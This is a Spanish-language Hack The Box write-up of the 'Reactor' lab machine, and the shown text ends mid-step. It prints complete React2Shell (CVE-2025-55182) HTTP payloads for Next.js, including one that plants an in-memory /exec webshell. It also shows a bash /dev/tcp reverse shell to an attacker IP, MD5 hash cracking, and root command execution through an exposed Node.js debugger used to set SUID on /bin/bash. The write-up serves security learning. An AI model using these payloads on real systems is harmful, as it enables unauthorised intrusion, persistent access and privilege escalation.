---
title: "Reactor - Hack The Box"
date: 2026-05-25
unlock_date: 2026-10-10
draft: false
slug: "htb-writeup-reactor"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, decidimos analizar a fondo la página web activa en el puerto 3000, ya que aplicando Fuzzing no encontramos nada. Al no encontrar algo útil, investigamos las tecnologías con las que se creó la página web, viendo que se ocupa Next.js versión 15.0.3, que resulta ser vulnerable a React2Shell (CVE-2025-66478 / CVE-2025-55182). Utilizamos un script de Python que nos ayuda a obtener una shell para ejecutar comandos, descubriendo una base de datos que, al analizarla, resulta ser de SQLite3. Al enumerar la BD, encontramos una contraseña como un Hash MD5 que pertenece a un usuario de la máquina víctima, que logramos crackear y así logramos conectarnos vía SSH. Dentro, analizamos los procesos ejecutándose en segundo plano, identificando el uso del debugger de Node.js de manera local ejecutado por el Root. Aplicamos Port Forwarding para poder entrar a la interfaz del debugger desde nuestra máquina y utilizamos Chronium para utilizar la herramienta DevTools, que nos va a permitir utilizar una consola en la que podremos ejecutar comandos. Gracias a esto, le asignamos permisos SUID a la Bash y así logramos escalar privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "SSH", "Next Js", "React", "Node Js", "SQLite3", "BurpSuite", "React2Shell", "CVE-2025-66478 and CVE-2025-55182", "SQLite3 Enumeration", "Cracking Hash", "Cracking MD5 Hash", "Port Forwarding", "Abusing Node Js Debugger", "Privesc - Abusing Node Js Debugger", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "BurpSuite"
  - "curl"
  - "tcpdump"
  - "nc"
  - "bash"
  - "python3"
  - "file"
  - "strings"
  - "sqlite3"
  - "hash-identifier"
  - "JohnTheRipper"
  - "crackstation"
  - "netexec"
  - "ssh"
  - "wget"
  - "chmod"
  - "pspy64"
  - "linpeas.sh"
  - "HackTricks"
  - "Chronium"
  - "DevTools"
links:
  - "https://github.com/xalgord/React2Shell"
  - "https://www.cronup.com/react2shell-cve-2025-55182-y-el-riesgo-de-rce-en-next-js/"
  - "https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478"
  - "https://react2shell.com/"
  - "https://tryhackme.com/room/react2shellcve202555182"
  - "https://crackstation.net/"
  - "https://github.com/dominicbreuker/pspy"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://hacktricks.wiki/es/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html#navegadores-websockets-y-pol%C3%ADtica-de-mismo-origen"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-reactor/reactor.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.4.96
PING 10.129.4.96 (10.129.4.96) 56(84) bytes of data.
64 bytes from 10.129.4.96: icmp_seq=1 ttl=63 time=66.9 ms
64 bytes from 10.129.4.96: icmp_seq=2 ttl=63 time=67.0 ms
64 bytes from 10.129.4.96: icmp_seq=3 ttl=63 time=75.6 ms
64 bytes from 10.129.4.96: icmp_seq=4 ttl=63 time=67.2 ms

--- 10.129.4.96 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 66.854/69.182/75.637/3.728 ms
```
Por el TTL sabemos que la máquina usa *****, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.4.96 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 09:40 -0600
Initiating SYN Stealth Scan at 09:40
Scanning 10.129.4.96 [65535 ports]
Discovered open port 22/tcp on 10.129.4.96
Discovered open port 3000/tcp on 10.129.4.96
Completed SYN Stealth Scan at 09:41, 23.16s elapsed (65535 total ports)
Nmap scan report for 10.129.4.96
Host is up, received user-set (0.28s latency).
Scanned at 2026-05-25 09:40:54 CST for 23s
Not shown: 43225 closed tcp ports (reset), 22308 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
           Raw packets sent: 113371 (4.988MB) | Rcvd: 43458 (1.738MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 2 puertos abiertos, pero veamos qué servicos corren.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,3000 10.129.4.96 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 09:41 -0600
Nmap scan report for 10.129.4.96
Host is up (0.067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?

| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 25 May 2026 15:42:08 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 25 May 2026 15:42:08 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=5/25%Time=6A146DCF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Mon,\x2025\x20May\x202026\x2015:42:08\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Mon,
SF:\x2025\x20May\x202026\x2015:42:08\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Mon,\x2025\x20May\x202026\x2015:42:08\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que el **puerto 3000** alberga una página web creada con **Next.js**. Además, se pueden observar algunas cabeceras que utiliza la página, pero no vemos ningún dominio o algo más.

Entonces, comencemos con esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web de Puerto 3000 {#Puerto3000}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura1.png">
</p>

Parece ser una página web que monitorea el rendimiento del hardware de una computadora.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura2.png">
</p>

Vemos que se está utilizando **React** y vemos que la página fue creada con **Next.js**, e igual podemos ver que utiliza la versión **15.0.3**.

De ahí en fuera no vemos algo más, por lo que podríamos hacer lo siguiente:
* Aplicar **Fuzzing** para descubrir archivos y/o directorios ocultos (no encontraremos nada).
* Analizar código fuente para buscar vulnerabildades.
* Investigar si las tecnologías tienen vulnerabilidades.

Dado que en el análisis del código fuente solo pudimos encontrar que la página web es estática, vamos a investigar si las tecnologías usadas tienen vulnerabilidades.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando React2Shell para Ejecutar Comandos Remotamente (RCE) {#react2shell}

Investigando la versión de **Next.js**, parece que puede ser vulnerable a **React2Shell**:

| **React2Shell (CVE-2025-55182)** |
|:--------------------------------:|
| *React2Shell (CVE-2025-55182) es una vulnerabilidad crítica de ejecución remota de código (RCE) sin autenticación (CVSS 10.0). Afecta al protocolo React Flight utilizado en React Server Components (RSC). Los atacantes explotan la deserialización insegura para manipular el entorno del servidor y ejecutar comandos arbitrarios con una simple petición HTTP.* |

Te dejo estos blogs que explican esta vulnerabilidad:
* <a href="https://react2shell.com/" target="_blank">React2Shell</a>
* <a href="https://tryhackme.com/room/react2shellcve202555182" target="_blank">TryHackMe: Room - react2shellcve202555182</a>

Y utilizaremos los payloads del siguiente repositorio:

* <a href="https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478" target="_blank">Repositorio de Malayke: Next.js-RSC-RCE-Scanner-CVE-2025-66478</a>

Para ejecutar esta vulnerabilidad, vamos a capturar la página web con **BurpSuite** y la mandamos al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura3.png">
</p>

Modifiquemos la petición para que se convierta en **petición POST**:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura4.png">
</p>

Ahora, utilizaremos el siguiente payload:
```bash
POST / HTTP/1.1
Host: IP:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```
Si te das cuenta, en el atributo `_prefix` es donde se está inyectando el comando.

Probémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura5.png">
</p>

Funciona.

Intentemos mandarnos un ping, inicia **tcpdump** para que capture paquetes **ICMP**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Modifica el comando en el atributo `_prefix` y envía la petición:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura6.png">
</p>

Observa el capturador:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:46:41.835889 IP 10.129.6.248 > Tu_IP: ICMP echo request, id 1485, seq 1, length 64
13:46:41.835912 IP Tu_IP > 10.129.6.248: ICMP echo reply, id 1485, seq 1, length 64
```
Tenemos conexión con la máquina víctima, pero tendremos problemas al intentar enviar una **Reverse Shell**.

Así que vamos a ejecutar la siguiente plantilla, pues creará una webshell que podremos utilizar para ejecutar comandos y para poder enviarnos la **Reverse Shell**:
```bash
POST / HTTP/1.1
Host: IP:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 1176

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/exec'){const cmd=p.query.cmd;if(!cmd){s.writeHead(400);s.end('cmd parameter required');return true;}try{s.writeHead(200,{'Content-Type':'application/json'});s.end(cp.execSync(cmd,{encoding:'utf8',stdio:'pipe'}));}catch(e){s.writeHead(500);s.end('Error: '+e.message);}return true;}}return o.apply(this,arguments);};})();",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

Una vez que la cargues y mandes la petición, el **Repeater** se quedará ejecutándola por lo que puedes probar si se pueden ejecutar comandos con **curl**:
```bash
curl "http://IP:3000/exec?cmd=whoami"
node
```
Excelente, sí funciona.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Entra en la URL que probamos y ejecuta la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/10.10.15.33/443 0>%261'
```

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura7.png">
</p>

Observa el listener:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.15.33] from (UNKNOWN) [10.129.6.248] 58370
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$ whoami
whoami
node
```
Estamos dentro.

Ya solo falta que obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

#### Aplicando React2Shell de Forma Automatizada con Script de Python {#python}

Una forma más sencilla de aplicar esta vulnerabilidad es utilizar el siguiente repositorio:
* <a href="https://github.com/xalgord/React2Shell" target="_blank">Repositorio de xalgord: React2Shell</a>

Una vez que lo descargues, lo único que tienes que darle al script es la URL de la página vulnerable y automáticamente te da una sesión interactiva:
```bash
python3 react2shell.py -u http://10.129.4.96:3000/
╔════════════════════════════════════════════════════════════╗
║              React2Shell - Next.js RCE Shell               ║
║  Target: http://10.129.4.96:3000/                          ║
║  Root Mode: OFF                                            ║
║  Type: Standalone (No Dependencies)                        ║
╚════════════════════════════════════════════════════════════╝

Commands:
  .root     - Toggle root mode (sudo -i)
  .save     - Save output to file
  .download - Download file from target
  .exit     - Exit shell
  .help     - Show this help

[*] Initializing shell...
ubuntu@target:/opt/reactor-app$ whoami
node
```
Incluso tenemos opciones para descargar/guardar archivos.

Una excelente herramienta para ejecutar esta vulnerabilidad que utilizaré para avanzar en la explotación.

### Enumeración de Base de Datos SQLite3 y Crackeo de Contraseña de Usuario engineer en Hash MD5 {#Cracking}

Si listamos los archivos locales, podremos ver una base de datos:
```bash
ubuntu@target:/opt/reactor-app$ ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

Vamos a descargarla:
```bash
ubuntu@target:/opt/reactor-app$ .download reactor.db
[*] Downloading reactor.db (via base64)...
[+] Downloaded to: /../HackTheBox/Season11/Reactor/content/React2Shell/downloaded/reactor.db
[+] Size: 12288 bytes
```

Veamos qué tipo de BD es:
```bash
file reactor.db
reactor.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 7, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 7
```
Es una BD de **SQLite3**.

Si vemos su contenido con el comando **strings**, veremos cómo se forma la BD y el contenido de sus columnas:
```bash
strings reactor.db
SQLite format 3
Mtablesensor_logssensor_logs
...
...
5engineer39d97110eafe2a9a68639812cd271e8eoperatorengineer@reactor.htbI
M'/admina203b22191d744a4e70ada5c101b17b8administratoradmin@reactor.htb
```

Otra opción es usar la herramienta **sqlite3** y ejecutar consultas sobre esa BD:
```bash
sqlite3 reactor.db ".tables"
sensor_logs  users      

sqlite3 reactor.db "SELECT * FROM users"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```
Observa que hay 2 usuarios y sus hashes.

Estos Hashes son de formato **MD5**:
```bash
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 39d97110eafe2a9a68639812cd271e8e

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

El único que podremos crackear será el del **usuario engineer** y lo podemos hacer con la herramienta **JonhTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
**********         (?)     
1g 0:00:00:00 DONE (2026-05-26 02:28) 16.66g/s 5619Kp/s 5619Kc/s 5619KC/s rhegie..rayleen
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

También podemos utilizar la página web **crackstation**:
* <a href="https://crackstation.net/" target="_blank">Crackstation</a>

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura8.png">
</p>

Comprobemos con **netexec** si la contraseña funciona con el **usuario engineer**:
```bash
nxc ssh 10.129.6.248 -u 'engineer' -p '**********'
SSH         10.129.6.248    22     10.129.6.248     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
SSH         10.129.6.248    22     10.129.6.248     [+] engineer:**********  Linux - Shell access!
```
Perfecto, sí funciona.

Conectémonos a la máquina víctima vía **SSH**:
```bash
ssh engineer@10.129.6.248
engineer@10.129.6.248's password: 
 ____  _____    _    ____ _____ ___  ____  

|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Wed May 27 20:41:05 2026
engineer@reactor:~$ whoami
engineer
```
Estamos dentro.

## Post Explotación {#Post}

### Abusando de Debugger de Node Js para Escalar Privilegios {#NodeJsExploit}

Podemos revisar los procesos en segundo plano que se estén ejecutando en la máquina víctima, usando la herramienta **pspy64**:
* <a href="https://github.com/dominicbreuker/pspy" target="_blank">Repositorio de dominicbreuker: pspy</a>

Para mandar la herramienta, se puede utilizar un servidor con **Python3** o usar la herramienta **scp**, en mi caso, usé lo primero:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

La descargamos en la máquina víctima, le damos permisos de ejecución y lo ejecutamos:
```bash
engineer@reactor:~$ wget http://Tu_IP:8000/pspy64
engineer@reactor:~$ chmod +x pspy64
engineer@reactor:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░ 
...
...
```

En los resultados, podemos ver que se está ejecutando un proceso en particular:
```bash
2026/05/25 19:47:31 CMD: UID=0     PID=1385   | /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Curiosamente, al ejecutar **linpeas.sh** igual menciona ese proceso como algo crítico para escalar privilegios:
```bash
engineer@reactor:~$ ./linpeas.sh
...
...
...
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
...
...
root        1385  0.0  1.1 1066408 46768 ?       Ssl  15:14   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Primero, investiguemos qué hace esa flag y por qué se está ejecutando de manera local en un puerto:

| **Node.js Debugger** |
|:--------------------:|
| *El debugger de Node.js es una funcionalidad que permite inspeccionar y controlar la ejecución de programas JavaScript que corren en Node.js. Con el debugger puedes: pausar ejecución, poner breakpoints, ejecutar código JavaScript dinámicamente, inspeccionar variables, modificar memoria/objetos, etc. Se activa con la flag --inspect del comando node.* |

Básicamente, es una interfaz a la que puedes entrar desde el navegador para depurar tu aplicación web.

Aquí podemos ver un artículo sobre cómo abusar de este debugger para ejecutar comandos y escalar privilegios:
* <a href="https://hacktricks.wiki/es/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html#navegadores-websockets-y-pol%C3%ADtica-de-mismo-origen" target="_blank">HackTricks: Abuso del depurador Node inspector/CEF</a>

Necesitaremos lo siguiente:
* Tener acceso o alcanzar el puerto donde está desplegado el debugger.
* El **UUID** único que se le asignó al proceso ejecutándose (debugger).
* Utilizar el modo depuración (**DevTools**) de **Chrome o Chronium**.

Ya vimos que el debugger está desplegado de manera local en el **puerto 9229**, así que podemos aplicar **Port Forwarding** para poder alcanzarlo desde nuestra máquina:
```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.6.248
engineer@10.129.6.248's password: 
 ____  _____    _    ____ _____ ___  ____  

|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Thu May 28 00:11:50 2026
engineer@reactor:~$
```

Bien, ahora consultemos la interfaz con **curl**:
```bash
curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/7e544873-78c3-4645-93a7-47399e4c8555",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/7e544873-78c3-4645-93a7-47399e4c8555",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "7e544873-78c3-4645-93a7-47399e4c8555",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/7e544873-78c3-4645-93a7-47399e4c8555"
} ]
```
Ahí podemos ver el **UUID**.

Para entrar directamente en la interfaz donde podremos ejecutar comandos, usaremos la siguiente ruta en **Chrome o Chronium**:
```bash
devtools://devtools/bundled/inspector.html?ws=127.0.0.1:9229/UUID
```

Yo usaré **Chronium**, aprovechando que estamos utilizando **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura9.png">
</p>

Posiciónate en la pestaña de la consola.

Prueba la siguiente sintaxis para ejecutar comandos:
```bash
require('child_process').execSync('id').toString()
```

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura10.png">
</p>

Excelente, podemos ver que quien ejecuta esos comandos es el **Root**.

Ya que tenemos acceso a la máquina víctima vía **SSH**, podemos simplemente asignar **permisos SUID** a la **Bash** para poder escalar privilegios.

Primero, veamos qué permisos tiene la **Bash**:
```bash
engineer@reactor:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Tiene los permisos correctos.

Ejecuta el siguiente comando en la interfaz:

```bash
chmod u+s /bin/bash
```

<p align="center">
<img src="/assets/images/htb-writeup-reactor/Captura11.png">
</p>

Vuelve a checar los permisos de la **Bash**:
```bash
